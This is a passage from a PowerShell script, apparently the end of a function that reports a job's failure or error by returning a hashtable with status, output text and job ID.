            $errorText = ($errorOutput | ForEach-Object { $_.Summary }) -join "`n"
            if ([string]::IsNullOrWhiteSpace($errorText)) {
                $errorText = "Job failed with status: $($jobStatus.Status)"
            }

            return @{
                Status = "Failed"
                Output = $errorText
                JobId = $job.JobId
            }
        }
    } catch {
        return @{
            Status = "Error"
            Output = $_.Exception.Message
            JobId = $null
        }
    }
}
